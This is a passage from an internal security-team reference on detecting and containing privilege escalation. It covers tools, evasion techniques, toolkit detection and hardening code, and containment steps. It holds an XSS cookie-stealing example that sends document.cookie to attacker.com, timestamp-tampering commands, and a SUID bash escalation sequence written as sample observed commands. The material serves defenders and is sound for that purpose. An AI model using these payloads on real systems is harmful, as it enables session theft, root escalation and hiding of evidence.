   - **Description**: Injecting scripts to steal authentication cookies or session tokens
   - **Common Vectors**: Reflected or stored XSS vulnerabilities
   - **Example Attack**:

     ```html
     <!-- Malicious script to steal cookies -->
     <script>
       fetch('https://attacker.com/steal?cookie='+encodeURIComponent(document.cookie))
     </script>
     ```

   - **MITRE ATT&CK**: T1059.007 (Command and Scripting Interpreter: JavaScript)
   - **Detection Method**: Script injection attempts, unusual cookie access
   - **Containment Strategy**: Content Security Policy, output encoding, HttpOnly and Secure cookies

## Exploitation Frameworks

### Common Privilege Escalation Tools

1. **Linux Privilege Escalation**
   - **LinPEAS**: Comprehensive Linux privilege escalation script
   - **LinEnum**: Linux enumeration script for penetration testing
   - **PEASS-ng**: Privilege Escalation Awesome Scripts Suite
   - **pspy**: Unprivileged Linux process snooping
   - **BeRoot**: Privilege escalation project

2. **Windows Privilege Escalation**
   - **PowerUp**: PowerShell privilege escalation toolkit
   - **PEASS-ng**: Privilege Escalation Awesome Scripts Suite
   - **PrivescCheck**: Windows privilege escalation checking script
   - **Seatbelt**: C# project for security-oriented host survey
   - **SharpUp**: C# port of PowerUp

3. **Cloud Privilege Escalation**
   - **Pacu**: AWS exploitation framework
   - **ScoutSuite**: Multi-cloud security auditing tool
   - **Rhino Security Labs cloud tools**: Various cloud exploitation scripts
   - **Stormspotter**: Azure security visualization tool
   - **GCP audit toolkit**: Scripts for GCP privilege escalation vectors

### Detection Evasion Techniques

1. **Living Off The Land**
   - **Description**: Using legitimate system tools for malicious purposes
   - **Common Tools**: PowerShell, WMI, WMIC, Certutil, Regsvr32
   - **Detection Method**: Behavioral analysis, command-line argument monitoring
   - **Containment Strategy**: Application allowlisting, PowerShell constrained language mode

2. **In-Memory Execution**
   - **Description**: Loading payloads directly into memory without touching disk
   - **Common Techniques**: Reflective DLL loading, process injection
   - **Detection Method**: Memory scanning, behavior analysis
   - **Containment Strategy**: Endpoint detection and response (EDR) solutions, memory integrity validation

3. **Timestamp Manipulation**
   - **Description**: Altering file timestamps to avoid detection
   - **Common Commands**:

     ```bash
     # Linux example
     touch -r reference_file modified_file

     # Windows example
     powershell "(Get-Item reference_file).LastWriteTime | Set-ItemProperty -Path modified_file -Name LastWriteTime"
     ```

   - **Detection Method**: File integrity monitoring, metadata analysis
   - **Containment Strategy**: Immutable logging, centralized log collection

## Implementation Reference

### Automated Detection Scripts

1. **Linux Privilege Escalation Detection**

   ```python
   # Example of Linux privilege escalation detection script
   from admin.security.incident_response_kit import detect_linux_escalation
   from admin.security.incident_response_kit.incident_constants import EscalationType, Severity

   # Detect common Linux privilege escalation techniques
   detection_results = detect_linux_escalation(
       target_host="linux-server-01",
       techniques=[
           EscalationType.SUID_BINARY_ABUSE,
           EscalationType.SUDO_MISCONFIGURATION,
           EscalationType.KERNEL_EXPLOIT,
           EscalationType.CRON_JOB_ABUSE
       ],
       detection_level="thorough"
   )

   # Process findings
   for finding in detection_results.findings:
       if finding.severity >= Severity.HIGH:
           print(f"Critical finding: {finding.title}")
           print(f"Technique: {finding.technique}")
           print(f"Evidence: {finding.evidence}")
           print(f"Recommended remediation: {finding.remediation}")
   ```

2. **Windows Privilege Escalation Detection**

   ```python
   # Example of Windows privilege escalation detection script
   from admin.security.incident_response_kit import detect_windows_escalation
   from admin.security.incident_response_kit.incident_constants import WindowsEscalationType, Severity

   # Detect common Windows privilege escalation techniques
   detection_results = detect_windows_escalation(
       target_host="windows-server-01",
       techniques=[
           WindowsEscalationType.UNQUOTED_SERVICE_PATH,
           WindowsEscalationType.WEAK_SERVICE_PERMISSIONS,
           WindowsEscalationType.ALWAYS_INSTALL_ELEVATED,
           WindowsEscalationType.TOKEN_IMPERSONATION
       ],
       scan_level="deep"
   )

   # Process findings
   critical_findings = [f for f in detection_results.findings if f.severity >= Severity.HIGH]
   if critical_findings:
       print(f"Found {len(critical_findings)} critical privilege escalation vulnerabilities:")
       for finding in critical_findings:
           print(f"- {finding.title}: {finding.description}")
           print(f"  Remediation: {finding.remediation}")
   ```

3. **Cloud Environment Scanning**

   ```python
   # Example of cloud privilege escalation scanning
   from admin.security.incident_response_kit import scan_cloud_environment
   from admin.security.incident_response_kit.incident_constants import CloudProvider, CloudEscalationType

   # Scan AWS environment for privilege escalation vectors
   aws_scan_results = scan_cloud_environment(
       provider=CloudProvider.AWS,
       account_id="123456789012",
       scan_types=[
           CloudEscalationType.EXCESSIVE_IAM_PERMISSIONS,
           CloudEscalationType.MISCONFIGURED_ROLES,
           CloudEscalationType.VULNERABLE_LAMBDA_FUNCTIONS
       ],
       detailed_report=True
   )

   # Process findings
   print(f"Found {len(aws_scan_results.findings)} potential privilege escalation vectors")
   for finding in aws_scan_results.findings:
       print(f"Resource: {finding.resource_id}")
       print(f"Issue: {finding.description}")
       print(f"Remediation: {finding.remediation_steps}")
       print("-" * 50)
   ```

### Real-Time Monitoring Configuration

1. **System Call Monitoring**

   ```python
   # Example of setting up system call monitoring for privilege escalation
   from core.security.cs_monitoring import monitor_syscalls

   # Configure privileged syscall monitoring
   syscall_config = monitor_syscalls(
       targets=["linux-production-servers"],
       watched_syscalls=[
           "setuid", "setgid", "setreuid", "setregid",
           "chmod", "chown", "execve"
       ],
       alert_on_unusual=True,
       baseline_learning_days=7,
       alert_threshold="medium",
       response_actions=[
           "log_event",
           "alert_security_team"
       ]
   )
   ```

2. **File Integrity Monitoring**

   ```python
   # Example of setting up file integrity monitoring for privilege escalation detection
   from core.security.cs_file_integrity import configure_file_monitoring

   # Configure monitoring for sensitive files
   monitoring_config = configure_file_monitoring(
       targets=["critical-servers"],
       file_paths=[
           {"path": "/etc/passwd", "criticality": "high"},
           {"path": "/etc/shadow", "criticality": "high"},
           {"path": "/etc/sudoers", "criticality": "high"},
           {"path": "/etc/sudoers.d/*", "criticality": "high"},
           {"path": "/etc/crontab", "criticality": "medium"},
           {"path": "/etc/cron.d/*", "criticality": "medium"},
           {"path": "C:\\Windows\\System32\\config\\SAM", "criticality": "high"},
           {"path": "C:\\Windows\\System32\\drivers\\etc\\hosts", "criticality": "medium"},
           {"path": "C:\\Windows\\System32\\Tasks\\*", "criticality": "medium"}
       ],
       monitor_attributes=["permissions", "owner", "content", "hash"],
       alert_on_changes=True,
       real_time=True
   )
   ```

3. **Cloud Trail Analysis**

   ```python
   # Example of setting up cloud trail analysis for privilege escalation
   from core.security.cs_monitoring import configure_cloud_trail_analysis
   from admin.security.incident_response_kit.incident_constants import CloudProvider

   # Configure analysis for AWS CloudTrail
   cloud_monitoring = configure_cloud_trail_analysis(
       provider=CloudProvider.AWS,
       account_ids=["123456789012"],
       monitored_event_names=[
           "CreatePolicy", "PutRolePolicy", "AttachRolePolicy",
           "AttachUserPolicy", "CreateAccessKey", "UpdateAssumeRolePolicy"
       ],
       baseline_comparison=True,
       alert_on_anomalies=True,
       detection_sensitivity="medium",
       response_actions={
           "high_risk": ["alert_security_team", "create_incident_ticket"],
           "critical_risk": ["alert_security_team", "create_incident_ticket", "invoke_remediation_lambda"]
       }
   )
   ```

### Containment Configuration

1. **Linux System Hardening**

   ```python
   # Example of Linux system hardening against privilege escalation
   from admin.security.incident_response_kit.recovery import harden_linux_system

   # Apply system hardening
   hardening_result = harden_linux_system(
       target="linux-server-01",
       hardening_profile="privilege_escalation_prevention",
       measures=[
           "remove_unused_suid_sgid_binaries",
           "restrict_sudo_configuration",
           "kernel_hardening",
           "file_permissions_hardening",
           "disable_uncommon_filesystems",
           "restrict_mount_options",
           "enable_auditd_monitoring"
       ],
       verify_changes=True,
       backup_config=True,
       incident_id="IR-2023-042"
   )
   ```

2. **Windows System Hardening**

   ```python
   # Example of Windows system hardening against privilege escalation
   from admin.security.incident_response_kit.recovery import harden_windows_system

   # Apply system hardening
   hardening_result = harden_windows_system(
       target="windows-server-01",
       hardening_profile="privilege_escalation_prevention",
       measures=[
           "set_uac_to_highest",
           "remove_admin_autologon",
           "disable_always_install_elevated",
           "secure_service_permissions",
           "restrict_token_privileges",
           "secure_registry_permissions",
           "enable_protected_process_light"
       ],
       verify_changes=True,
       backup_config=True,
       incident_id="IR-2023-042"
   )
   ```

3. **Cloud Environment Hardening**

   ```python
   # Example of cloud environment hardening against privilege escalation
   from admin.security.incident_response_kit.recovery import harden_cloud_environment
   from admin.security.incident_response_kit.incident_constants import CloudProvider

   # Apply cloud hardening
   hardening_result = harden_cloud_environment(
       provider=CloudProvider.AWS,
       account_id="123456789012",
       hardening_profile="privilege_escalation_prevention",
       measures=[
           "implement_scps",
           "restrict_iam_permissions",
           "enforce_imdsv2",
           "enable_cloudtrail_validation",
           "implement_lambda_least_privilege",
           "enable_role_permission_boundaries"
       ],
       verify_changes=True,
       backup_config=True,
       incident_id="IR-2023-042"
   )
   ```

## Available Functions

### Detection Functions

```python
from admin.security.incident_response_kit import (
    detect_linux_escalation,
    detect_windows_escalation,
    scan_cloud_environment,
    analyze_container_security,
    match_escalation_technique,
    identify_vulnerable_configurations,
    verify_escalation_path
)

# Detect Linux privilege escalation vulnerabilities
linux_results = detect_linux_escalation(
    target_host="linux-server-01",
    techniques="all",
    detection_level="thorough"
)

# Detect Windows privilege escalation vulnerabilities
windows_results = detect_windows_escalation(
    target_host="windows-server-01",
    techniques="common",
    scan_level="standard"
)

# Match observed behavior to known techniques
match_results = match_escalation_technique(
    observed_commands=["chmod u+s /usr/bin/bash", "cp /bin/bash /tmp/bash", "chmod u+s /tmp/bash"],
    file_modifications=["/tmp/bash"],
    system_type="linux"
)
```

### Analysis Functions

```python
from admin.security.incident_response_kit import (
    analyze_attack_path,
    reconstruct_privilege_chain,
    calculate_exposure_risk,
    assess_lateral_movement_potential,
    validate_remediation_effectiveness,
    simulate_escalation_attack,
    verify_security_controls
)

# Analyze the privilege escalation attack path
path_analysis = analyze_attack_path(
    entry_point="web-server-01",
    escalation_evidence=evidence_collection_result,
    include_timeline=True,
    visualization=True
)

# Verify security controls against common techniques
control_assessment = verify_security_controls(
    target_systems=["critical-servers"],
    control_types=["file_permissions", "sudo_config", "service_permissions"],
    generate_report=True
)
```

### Remediation Functions

```python
from admin.security.incident_response_kit.recovery import (
    harden_linux_system,
    harden_windows_system,
    harden_cloud_environment,
    fix_container_security,
    secure_web_application,
    implement_privilege_boundaries,
    rotate_compromised_credentials,
    verify_security_baseline
)

# Fix container security issues
container_remediation = fix_container_security(
    container_environment="kubernetes-production",
    issues_to_address=["privileged_containers", "exposed_docker_socket", "excessive_capabilities"],
    enforce_pod_security_standards=True
)

# Implement proper privilege boundaries
privilege_boundaries = implement_privilege_boundaries(
    environment="hybrid-cloud",
    boundary_types=["network", "identity", "resource"],
    enforce_least_privilege=True
)
```

### Utility Functions

```python
from admin.security.incident_response_kit.utils import (
    check_exploitable_misconfigurations,
    generate_hardening_recommendations,
    classify_escalation_techniques,
    prioritize_vulnerabilities,
    format_findings_report,
    get_mitigation_steps
)

# Get specific mitigation steps for an escalation technique
mitigation = get_mitigation_steps(
    technique="sudo_rule_abuse",
    environment="linux",
    format="detailed"
)

# Prioritize identified vulnerabilities
prioritized_vulns = prioritize_vulnerabilities(
    vulnerabilities=detection_results.findings,
    criteria=["exploitability", "impact", "remediation_effort"]
)
```

## Containment Strategies

### Linux Containment

1. **Immediate Containment Steps**
   - Remove write permissions from sensitive directories
   - Reset SUID/SGID permissions on critical binaries
   - Restrict sudo privileges to minimum necessary
   - Implement process and file system restrictions with AppArmor/SELinux
   - Temporarily disconnect from network if needed

2. **Privilege Restriction Measures**
   - Enforce sudo noexec option to prevent shell escapes
   - Apply restrictive umask settings (022 or stricter)
   - Implement capability bounding sets
   - Configure secure mount options (noexec, nosuid, nodev)
   - Apply restrictive ulimits

3. **Monitoring Enhancement**
   - Enable comprehensive auditd rules
   - Monitor privileged command execution
   - Track all authentication events
   - Monitor file system changes in sensitive areas
   - Implement process ancestry monitoring

### Windows Containment

1. **Immediate Containment Steps**
   - Reset service permissions to defaults
   - Configure UAC to maximum level
   - Restrict PowerShell execution policy
   - Apply strict registry permissions
   - Temporarily disable vulnerable services

2. **Privilege Restriction Measures**
   - Implement Protected Process Light for critical services
   - Configure AppLocker or Software Restriction Policies
   - Enable Credential Guard and Device Guard where available
   - Restrict token privileges to minimum necessary
   - Implement Just Enough Administration (JEA)

3. **Monitoring Enhancement**
   - Enable comprehensive Windows Event Logging
   - Monitor process creation events
   - Track privilege use auditing
   - Monitor registry and file system changes
   - Enable PowerShell script block logging

### Cloud Environment Containment

1. **AWS Containment Strategies**
   - Implement Service Control Policies (SCPs)
   - Apply IAM permission boundaries
   - Enforce IMDSv2 for all EC2 instances
   - Enable guardrails through AWS Config
   - Implement strict VPC security controls

2. **Azure Containment Strategies**
   - Implement Privileged Identity Management
   - Apply Azure Policy restrictions
   - Configure Just-In-Time VM access
   - Implement network security groups
   - Enable Azure Active Directory Conditional Access

3. **GCP Containment Strategies**
   - Implement Organization Policy Constraints
   - Apply custom IAM roles with least privilege
   - Configure VPC Service Controls
   - Implement context-aware access
   - Enable shielded VMs and secure boot

## Best Practices & Security

- **Principle of Least Privilege**: Grant minimum permissions necessary for function
- **Defense in Depth**: Implement multiple layers of security controls
- **Regular Vulnerability Scanning**: Conduct routine checks for privilege escalation vectors
- **Security Patching**: Maintain current patch levels for operating systems and applications
- **Configuration Management**: Maintain secure baseline configurations
- **Secure CI/CD Pipelines**: Verify security before deployment
- **Privilege Access Management**: Implement just-in-time access for administrative privileges
- **Regular Security Audits**: Review permissions and access controls periodically
- **Immutable Infrastructure**: Rebuild systems instead of modifying them when possible
- **Network Segmentation**: Limit lateral movement through network controls
- **Secure Boot Processes**: Implement secure boot and measured boot where possible
- **File Integrity Monitoring**: Track changes to critical system files
- **Robust Logging**: Maintain comprehensive audit logs of privileged operations
- **Credential Vaulting**: Securely store and automatically rotate privileged credentials
- **Behavioral Analytics**: Implement anomaly detection for privileged access
- **Multi-Factor Authentication**: Require MFA for all privileged operations

## Related Documentation

### Internal References

- Privilege Escalation Detection Guide - Detailed guide on detecting privilege escalation
- Privilege Escalation Response Playbook - Incident response procedures for privilege escalation
- Permission Validation Procedures - Procedures for validating permissions
- Evidence Collection Guide - Procedures for collecting evidence during security incidents
- Security Tools Reference - Reference guide for security tools
- Credential Compromise Remediation - Guide for credential compromise remediation
- Container Security Guide - Container security best practices
- Cloud Security Hardening - Cloud environment security hardening procedures

### External References

- [MITRE ATT&CK: Privilege Escalation](https://attack.mitre.org/tactics/TA0004/) - Comprehensive resource for privilege escalation techniques
- [OWASP Top 10](https://owasp.org/Top10/) - Common web application vulnerabilities including privilege escalation
- [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks/) - Secure configuration standards
- [Linux Privilege Escalation Techniques](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) - Common Linux privilege escalation methods
- [Windows Privilege Escalation Techniques](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md) - Common Windows privilege escalation methods
- [Kubernetes Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Kubernetes_Security_Cheat_Sheet.html) - Kubernetes security best practices
- [AWS Security Best Practices](https://aws.amazon.com/architecture/security-identity-compliance/) - AWS security resources and best practices

---

**Document Information**
Version: 1.1
Last Updated: 2023-10-05
Document Owner: Security Engineering Team
Review Schedule: Quarterly
Classification: Internal Use Only
